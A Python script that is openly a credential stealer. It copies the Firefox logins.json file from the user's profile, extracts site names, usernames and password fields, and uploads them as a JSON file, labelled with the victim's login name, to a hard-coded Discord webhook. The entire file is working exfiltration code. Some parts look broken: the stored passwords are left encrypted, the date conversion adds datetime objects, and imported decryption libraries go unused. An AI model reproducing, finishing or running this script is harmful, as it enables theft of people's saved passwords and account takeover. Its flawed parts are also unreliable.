import os
import json
import shutil
import sqlite3
from datetime import datetime, timezone
from discord_webhook import DiscordWebhook
from Crypto.Cipher import AES
import win32crypt

WEBHOOK = 'https://discord.com/api/webhooks/1095102175551696926/FoYrcSnMlyg6davQV_x0leIi8qPLn8RcsSTwpcYSA0qfPiXfrIoTevGkeHf_J44aq-N'

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception as e:
        USERNAME = "None"
    return USERNAME

def my_firefox_datetime(time_in_microseconds):
    return datetime(1970, 1, 1, tzinfo=timezone.utc) + \
        datetime.utcfromtimestamp(time_in_microseconds / 1000000) - \
        datetime(1601, 1, 1, tzinfo=timezone.utc)

def steal_firefox_creds():
    
    password_db_path = None
    profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for foldername in os.listdir(profile_path):
        folder_path = os.path.join(profile_path, foldername)
        if os.path.isdir(folder_path):
            password_db_path = os.path.join(folder_path, "logins.json")
            break
    if password_db_path is None:
        raise Exception("logins.json not found in Firefox profile folder")

    tmp_path = os.path.join(os.environ["TEMP"], "logins.json")
    shutil.copyfile(password_db_path, tmp_path)

    with open(tmp_path, "r", encoding="utf-8") as f:
        data = json.load(f)
        creds = {}
        for entry in data["logins"]:
            if "http" not in entry["hostname"] and "https" not in entry["hostname"]:
                continue  
            url = entry["hostname"] + entry["httpRealm"]
            username = entry["username"]
            password = entry["password"]
            date_created = my_firefox_datetime(entry["timeCreated"])
            if url not in creds:
                creds[url] = []
            creds[url].append({
                "username": username,
                "password": password,
                "date_created": str(date_created),
            })
        os.remove(tmp_path)
        return creds

webhook = DiscordWebhook(url=WEBHOOK, username="Credential Stealer", content=f"Firefox Credentials from: {getUsername()}")
try:
    firefox_creds = steal_firefox_creds()
    path = os.path.join(os.environ["TEMP"], "firefox_creds.json")
    with open(path, 'w+') as outfile:
        json.dump(firefox_creds, outfile, indent=4)
    with open(path, "rb") as f:
        webhook.add_file(file=f.read(), filename='firefox_creds.json')
    response = webhook.execute()
    os.remove(path)
except Exception as e:
    webhook.set_content(f"Error while getting Firefox credentials from {getUsername()}: {e}")
    response = webhook.execute()
